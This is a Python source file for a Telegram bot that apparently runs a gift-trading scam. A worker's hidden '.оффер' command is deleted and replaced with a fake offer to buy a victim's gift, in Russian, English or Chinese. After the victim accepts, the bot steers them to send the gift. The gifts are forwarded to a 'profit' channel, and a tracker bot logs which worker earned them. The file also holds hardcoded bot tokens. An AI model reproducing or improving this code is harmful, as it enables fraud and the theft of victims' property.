import asyncio
import logging
import uuid
import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest

# =====================================
# НАСТРОЙКИ
# =====================================
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
TARGET_USERNAME = "rattiixx"
CURRENCY = {"g": "💎", "s": "⭐"}

TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
TRACKER_ADMIN_ID = 9158877731
PROFIT_CHANNEL_ID = -1003914079695
PROFIT_TOPIC_ID = 3

TEXTS = {
    "ru": {
        "offer_text": "Пользователь <b>{who}</b> предлагает Вам {sum} {cur} за подарок <b>{name}</b>.",
        "accepted": "🎁 <b>Подарок:</b> {name}\n\n<b>Предложение принято!</b>\n\nОжидается передача подарка.\n\nСумма предложения: {sum} {cur}",
        "btn_give": "🎁 Передать подарок",
        "btn_how": "❓ Как передать?",
        "btn_decline": "❌ Отклонить",
        "btn_accept": "✅ Принять",
        "alert_how": "Нажмите на кнопку ниже, чтобы открыть интерфейс подарка.\n\nЗатем выберите подарок и отправьте его получателю.",
        "declined": "Вы отклонили предложение."
    },
    "en": {
        "offer_text": "User <b>{who}</b> offers You {sum} {cur} for the gift <b>{name}</b>.",
        "accepted": "🎁 <b>Gift:</b> {name}\n\n<b>Offer accepted!</b>\n\nWaiting for gift transfer.\n\nOffer amount: {sum} {cur}",
        "btn_give": "🎁 Give gift",
        "btn_how": "❓ How to give?",
        "btn_decline": "❌ Decline",
        "btn_accept": "✅ Accept",
        "alert_how": "Click the button below to open the gift interface.\n\nThen choose a gift and send it to the recipient.",
        "declined": "You have declined the offer."
    },
    "cn": {
        "offer_text": "用户 <b>{who}</b> 向您提供 {sum} {cur} 以换取礼物 <b>{name}</b>。",
        "accepted": "🎁 <b>礼物：</b> {name}\n\n<b>已接受！</b>\n\n等待礼物转移。\n\n出价金额：{sum} {cur}",
        "btn_give": "🎁 赠送礼物",
        "btn_how": "❓ 如何赠送？",
        "btn_decline": "❌ 拒绝",
        "btn_accept": "✅ 接受",
        "alert_how": "点击下方按钮打开礼物界面。\n\n然后选择一个礼物并发送给接收者。",
        "declined": "您已拒绝该提议。"
    }
}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}
http_session: aiohttp.ClientSession = None

LARGE_PREVIEW = LinkPreviewOptions(
    is_disabled=False,
    prefer_large_media=True,
    show_above_text=True
)

# =====================================
# КНОПКИ
# =====================================
def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    return InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}"),
            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}")
        ]]
    )

def instruction_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    # ВАРИАНТ 2, КАК ТЫ ПРОСИЛ
    gift_url = "https://t.me/gifts?ref=rattiixx"
    
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=t["btn_give"], url=gift_url)],
            [InlineKeyboardButton(text=t["btn_how"], callback_data=f"alert_2:{lang}")]
        ]
    )

# =====================================
# ТРЕКЕР
# =====================================
tracker_bot = None
if TRACKER_BOT_TOKEN:
    tracker_bot = Bot(token=TRACKER_BOT_TOKEN)

async def tracker_log(text: str):
    if not tracker_bot:
        return
    try:
        await tracker_bot.send_message(TRACKER_ADMIN_ID, text)
        await tracker_bot.send_message(
            PROFIT_CHANNEL_ID, text, message_thread_id=PROFIT_TOPIC_ID
        )
    except Exception as e:
        logging.error(f"Tracker error: {e}")

# =====================================
# ПАРСИНГ НАЗВАНИЯ
# =====================================
async def fetch_gift_name(url: str) -> str:
    try:
        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            html = await resp.text()
            start = html.find('og:title"')
            if start != -1:
                start = html.find('content="', start) + len('content="')
                end = html.find('"', start)
                return html[start:end]
    except Exception:
        pass
    return url.rsplit("/", 1)[-1] or url

# =====================================
# КОМАНДА .оффер
# =====================================
@dp.business_message(F.text)
async def handle_custom_command(message: Message):
    if not message.text or not message.text.startswith(".оффер"):
        return

    logging.info("!!! БОТ УВИДЕЛ КОМАНДУ .оффер !!!")
    try:
        text = message.text.replace(".оффер", "", 1).strip()
        parts = text.split()

        if len(parts) < 3:
            return

        url = parts[0]
        raw_sum = parts[1]
        cur_key = parts[2].lower()
        lang = parts[3].lower() if len(parts) > 3 else "ru"

        if url.startswith("http://"):
            url = url.replace("http://", "https://", 1)
        elif not url.startswith("http"):
            url = "https://" + url

        if cur_key not in CURRENCY:
            return

        t = TEXTS.get(lang, TEXTS["ru"])
        gift_name = await fetch_gift_name(url)

        oid = uuid.uuid4().hex[:8]
        OFFERS[oid] = {
            "url": url,
            "sum": raw_sum,
            "cur": CURRENCY[cur_key],
            "lang": lang,
            "gift_name": gift_name,
            "seller_name": f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name,
        }

        # Удаляем команду
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception as e:
            logging.error(f"Delete error: {e}")

        # Отправляем оффер с картинкой
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=t["offer_text"].format(
                    who=OFFERS[oid]["seller_name"],
                    sum=raw_sum,
                    cur=CURRENCY[cur_key],
                    name=gift_name
                ) + f"\n\n{url}",
                reply_markup=offer_kb(oid, lang),
                business_connection_id=message.business_connection_id,
                link_preview_options=LARGE_PREVIEW
            )
            logging.info("Оффер успешно отправлен!")
        except Exception as e:
            logging.error(f"Send error: {e}")

        await tracker_log(
            f"🆕 Оффер {oid}: {OFFERS[oid]['seller_name']} | {raw_sum} {CURRENCY[cur_key]} | {gift_name}"
        )
        
    except Exception:
        logging.exception("Ошибка в .оффер")

# =====================================
# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ
# =====================================
@dp.callback_query(F.data.startswith("acc:"))
async def cb_accept(call: CallbackQuery):
    oid = call.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer:
        return await call.answer("Оффер не найден", show_alert=True)
    
    lang = offer.get("lang", "ru")
    t = TEXTS.get(lang, TEXTS["ru"])

    text = t["accepted"].format(
        name=offer["gift_name"],
        sum=offer["sum"],
        cur=offer["cur"]
    ) + f"\n\n{offer['url']}"

    try:
        await call.message.edit_text(
            text=text,
            reply_markup=instruction_kb(lang),
            link_preview_options=LARGE_PREVIEW
        )
    except TelegramBadRequest:
        pass

    await call.answer()
    await tracker_log(
        f"✅ Оффер принят\nID: {oid}\nПодарок: {offer['gift_name']}\n"
        f"Сумма: {offer['sum']} {offer['cur']}"
    )

@dp.callback_query(F.data.startswith("dec:"))
async def cb_decline(call: CallbackQuery):
    oid = call.data.split(":", 1)[1]
    offer = OFFERS.pop(oid, None)
    if not offer:
        return await call.answer("Оффер не найден", show_alert=True)

    lang = offer.get("lang", "ru")
    t = TEXTS.get(lang, TEXTS["ru"])

    try:
        await call.message.edit_text(text=t["declined"], reply_markup=None)
    except TelegramBadRequest:
        pass

    await call.answer()
    await tracker_log(f"❌ Оффер отклонён\nID: {oid}")

@dp.callback_query(F.data.startswith("alert_2:"))
async def cb_alert(call: CallbackQuery):
    lang = call.data.split(":", 1)[1]
    t = TEXTS.get(lang, TEXTS["ru"])
    await call.answer(t["alert_how"], show_alert=True)

# =====================================
# ПОЛУЧЕНИЕ ПОДАРКА
# =====================================
@dp.business_message(F.gift)
async def handle_gift(message: Message):
    gift = message.gift
    if not gift: return
    try:
        conn = await bot.get_business_connection(message.business_connection_id)
        worker_id = conn.user.id
    except Exception:
        worker_id = "unknown"

    stars = getattr(gift, "star_count", 0) or 0
    base_name = getattr(gift, "base_name", "") or ""
    gift_id = getattr(gift, "id", "")

    try:
        await bot.forward_message(
            chat_id=PROFIT_CHANNEL_ID, message_thread_id=PROFIT_TOPIC_ID,
            from_chat_id=message.chat.id, message_id=message.message_id
        )
    except Exception as e:
        logging.error(f"Forward error: {e}")

    tracker_text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
    tracker_url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
    try:
        async with http_session.post(tracker_url, json={"chat_id": TRACKER_ADMIN_ID, "text": tracker_text}) as resp:
            if resp.status != 200:
                logging.error(f"Tracker error: {await resp.text()}")
    except Exception as e:
        logging.error(f"HTTP error: {e}")

# =====================================
# ЗАПУСК
# =====================================
async def main():
    global http_session
    http_session = aiohttp.ClientSession()
    print("Оффер-бот запущен!")
    try:
        await dp.start_polling(bot, allowed_updates=["business_message", "message", "callback_query"])
    finally:
        await http_session.close()

if __name__ == "__main__":
    asyncio.run(main())
